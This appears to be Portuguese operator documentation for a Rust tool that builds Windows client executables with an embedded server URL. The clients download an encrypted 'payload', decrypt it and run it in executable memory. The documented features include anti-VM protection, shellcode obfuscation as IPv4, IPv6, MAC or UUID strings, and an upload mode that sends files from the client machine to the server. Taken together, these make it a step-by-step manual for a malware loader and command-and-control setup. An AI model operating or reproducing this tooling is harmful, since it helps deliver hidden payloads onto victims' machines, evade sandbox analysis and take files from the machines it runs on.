# Execução

## Servidor (Linux)

Binário: `target/release/server`.

### Opções globais

| Flag | Padrão | Descrição |
|---|---|---|
| `--db <arquivo>` | `data/orchestrator.db` | caminho do banco SQLite |
| `--data-dir <dir>` | `data` | diretório de artefatos, staging e clientes |

### Senha-mestra

Lida da variável de ambiente `SERVER_MASTER_PASSPHRASE`; se ausente, o servidor pergunta
interativamente (entrada oculta). A mesma senha precisa ser usada em todas as execuções —
é ela que abre o banco criptografado.

### Senha de operador e comandos administrativos

Além da senha-mestra, o CLI usa uma senha de operador separada para autorizar operações
administrativas locais. A senha de operador é armazenada somente como hash Argon2id no
SQLite e não substitui a senha-mestra.

Configure-a uma vez:

```bash
SERVER_MASTER_PASSPHRASE=sua-senha ./target/release/server \
  --db data/orchestrator.db --data-dir data operator init
```

Depois disso, os comandos abaixo pedem a senha de operador:

```bash
# Histórico dos builds, sem chaves ou passphrases privadas
SERVER_MASTER_PASSPHRASE=sua-senha ./target/release/server builds --limit 50

# Últimas linhas do log persistido
SERVER_MASTER_PASSPHRASE=sua-senha ./target/release/server logs --lines 100

# Diagnósticos continuam blobs PGP e não são descriptografados pelo servidor
SERVER_MASTER_PASSPHRASE=sua-senha ./target/release/server diagnostics
SERVER_MASTER_PASSPHRASE=sua-senha ./target/release/server diagnostics --build-id build-<hex>
```

Os logs ficam em `data/logs/server.log`. O CLI administrativo é local; não existe login
administrativo pela API HTTP. A senha-mestra e a senha de operador nunca devem ser incluídas
em argumentos ou arquivos de log.

### Usuários nomeados

Em um banco novo, crie o primeiro usuário diretamente:

```bash
SERVER_MASTER_PASSPHRASE=sua-senha ./target/release/server user create n0kk
```

O comando pede a senha duas vezes sem exibi-la. Depois, os comandos administrativos pedem
`Username` e `Password`. Para listar usuários:

```bash
SERVER_MASTER_PASSPHRASE=sua-senha ./target/release/server user list
```

Em bancos antigos, `operator init` continua disponível e cria/atualiza o usuário legado
`operator`.

Se o banco antigo já possui `operator_auth`, primeiro redefina ou configure a senha legada:

```bash
SERVER_MASTER_PASSPHRASE=sua-senha ./target/release/server operator init
```

Depois crie `n0kk`. Na autenticação, informe o administrador existente (`operator`) e então
escolha a nova senha de `n0kk`:

```text
Username: operator
Password: <senha do operator>
New operator password: <senha do n0kk>
Repeat operator password: <senha do n0kk>
```

Para abrir o console interativo como `n0kk`:

```bash
SERVER_MASTER_PASSPHRASE=sua-senha ./target/release/server console
```

Informe `n0kk` no campo `Username` e a senha definida para ele:

```text
Username: n0kk
Password:
server>
```

Dentro do console, use `help`. Exemplos:

```text
builds
logs 100
diagnostics
listen
client create --artifact ./payload.bin --uid release-1 --no-antivm
client create --artifact ./payload.bin --target x86_64-pc-windows-gnu --server-url https://127.0.0.1:8443 --no-antivm --debug
exit
```

Com `--debug`, o client é compilado sem `--release`. Ao ser executado, ele cria
`Desktop/RustBuilder-debug/client.log` e registra os eventos de execução e erros.

O comando `listen` inicia a API HTTPS dentro do próprio console, usando
`https://127.0.0.1:8443` por padrão. Ele aceita um endereço e SANs opcionais:

```text
listen 0.0.0.0:8443 seu-host 127.0.0.1
```

Enquanto o listener estiver ativo, o console fica bloqueado atendendo requisições.
Para voltar ao prompt, encerre o processo do servidor e abra o console novamente.

O usuário do CLI é uma credencial da aplicação e não altera o usuário do Linux. A passphrase
`SERVER_MASTER_PASSPHRASE` continua sendo necessária em cada execução.

### Subcomando `new-build`

Gera a chave PGP, criptografa o artefato, emite o certificado do cliente, grava tudo
(lacrado) no banco e **compila o binário do cliente**.

```bash
SERVER_MASTER_PASSPHRASE=sua-senha ./target/release/server \
  --db data/orchestrator.db --data-dir data \
  new-build \
    --artifact ./payload.bin \
    --uid release-1 \
    --server-url https://seu-host:8443 \
    --target x86_64-pc-windows-gnu
```

| Flag | Padrão | Descrição |
|---|---|---|
| `--artifact <arquivo>` | (obrigatório) | arquivo em texto puro a ser distribuído |
| `--uid <id>` | (obrigatório) | identificador lógico do release (vai no UID da chave PGP) |
| `--server-url <url>` | `https://127.0.0.1:8443` | URL embutida no cliente |
| `--target <triple>` | (nenhum = nativo) | alvo do cliente, ex.: `x86_64-pc-windows-gnu` |
| `--no-antivm` | (desligado) | compila o cliente sem a proteção anti-VM (`--no-default-features`); útil para testes de desenvolvimento. Ver [antivm.md](antivm.md) |
| `--debug` | (desligado) | compila um cliente nativo de debug em vez de release |
| `--obfs` | (desligado) | habilita o subcomando `obf` de representação de shellcode |

Saída (impressa no fim):

```
build id:       build-<hex>
client binary:  data/clients/build-<hex>/client.exe
encrypted file: data/artifacts/build-<hex>.pgp
```

Arquivos gerados:
- `data/artifacts/<id>.pgp` — artefato criptografado.
- `data/staging/<id>/ca.pem`, `identity.pem` — assets usados na compilação do cliente
  (também úteis para testar com `curl`).
- `data/clients/<id>/client.exe` — o cliente funcional daquele build.

### Subcomando `serve`

Sobe a API mTLS.

```bash
SERVER_MASTER_PASSPHRASE=sua-senha ./target/release/server \
  --db data/orchestrator.db --data-dir data \
  serve --addr 0.0.0.0:8443 --san seu-host --san 127.0.0.1
```

| Flag | Padrão | Descrição |
|---|---|---|
| `--addr <ip:porta>` | `127.0.0.1:8443` | endereço de escuta |
| `--san <nome>` (repetível) | `localhost`, `127.0.0.1` | SANs do certificado do servidor |

> Os `--san` precisam bater com o host que o cliente usa na URL (`--server-url`), senão a
> verificação TLS do certificado do servidor falha no cliente.

## Cliente (Windows)

Binário: o `client.exe` gerado pelo `new-build` (em `data/clients/<id>/`), copiado para a
máquina Windows.

```bat
client.exe --out C:\saida\arquivo.bin
```

| Flag | Padrão | Descrição |
|---|---|---|
| `--out <arquivo>` | pasta temporária do sistema | onde gravar o arquivo descriptografado antes de executá-lo; se omitido, usa `rustbuilder-<build-id>.bin` em `%TEMP%` no Windows |
| `--upload <arquivo>` | (opcional) | envia este arquivo como diagnóstico cifrado (modo upload) |
| `--server <url>` | valor embutido no build | sobrescreve a URL do servidor |
| `--build-id <id>` | valor embutido no build | sobrescreve o id do build |

O cliente conecta por mTLS (com a identidade embutida), baixa o artefato cifrado e a chave
privada, **descriptografa localmente**, grava em `--out` e executa o artefato. No Windows, a
execução carrega os bytes em chunks de 256 bytes para memória executável. Se `--out` for
omitido, o arquivo é gravado automaticamente na pasta temporária do sistema.

Com `--debug`, o cliente gerado grava um log em `Desktop/RustBuilder-debug/client.log`. Com
`--obfs`, o cliente também aceita `obf --file <path> --technique <ipv4|ipv6|mac|uuid>
--operation <obfuscate|deobfuscate>`; a obfuscação grava um nome de saída fixo no diretório
atual.

### Upload de diagnósticos

Com `--upload <arquivo>`, o cliente cifra o arquivo com a chave pública PGP do build (embutida
no binário) e o envia ao servidor em chunks (`POST /builds/:id/diagnostics`); o servidor grava
o blob cifrado em `data/diagnostics/<id>/`. O texto puro nunca sai da máquina do cliente. Esse
modo é um wrapper fino sobre a função reutilizável `upload_diagnostic`. Depois do upload, o
cliente encerra sem executar o caminho de download ou execução.

```bat
client.exe --upload C:\diag\coleta.txt
```

O download é **comprimido (gzip no transporte)** e feito **em chunks**: durante a
transferência o cliente grava o ciphertext (PGP, já cifrado) num arquivo temporário
`<out>.part` ao lado de `--out`, descriptografa a partir dele e o **remove ao final** (também
em caso de erro). O texto puro só existe em memória e no arquivo `--out`.

## Fluxo ponta a ponta (exemplo de teste local)

```bash
export PATH="$HOME/.cargo/bin:$PATH"
export SERVER_MASTER_PASSPHRASE=sua-senha
echo "conteúdo secreto" > payload.txt

# 1) criar build (cliente nativo p/ testar no próprio Linux; troque --target p/ Windows)
./target/release/server --data-dir data new-build \
  --artifact payload.txt --uid demo

# 2) subir o servidor (em outro terminal, ou em background)
./target/release/server --data-dir data serve &

# 3) rodar o cliente gerado
BID=$(ls data/clients | head -1)
./data/clients/$BID/client --out saida.txt

# 4) conferir
diff payload.txt saida.txt && echo "OK"
```

Resultado validado durante o desenvolvimento: conteúdo idêntico após o roundtrip
(inclusive com acentuação), e `403` ao tentar buscar a chave de outro build.
